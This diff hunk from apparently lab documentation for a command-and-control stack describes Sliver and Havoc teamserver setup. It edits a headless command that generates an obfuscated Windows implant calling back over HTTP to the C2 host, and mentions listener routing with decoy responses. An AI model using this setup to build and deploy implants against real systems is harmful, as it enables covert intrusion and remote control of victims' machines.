@@ -256,7 +256,7 @@ images and the named volumes were intact. Re-verified after boot:
   RootPath `/cloud/storage/objects`) — verified live: with-header requests hit the
   listener, decoy without header. Full garble `generate` proven on v1.7.7 (47s build);
   headless generation works: `sliver-client console --rc gen.rc` where the rc file
-  contains `generate --http 192.168.100.1:80 --os windows --arch amd64 --name X` + `exit`.
+  contains `generate --http <C2STACK_IP>:80 --os windows --arch amd64 --name X` + `exit`.
 - **Havoc** — v0.7 teamserver with the C2Stack HTTP listener in the profile template
   (`Docker/havoc/havoc.yaotl`, rendered by `entrypoint.sh` from `VICTIM_REDIRECTOR_IP`):
   bind :80, Uris `/edge/cache/assets/`,
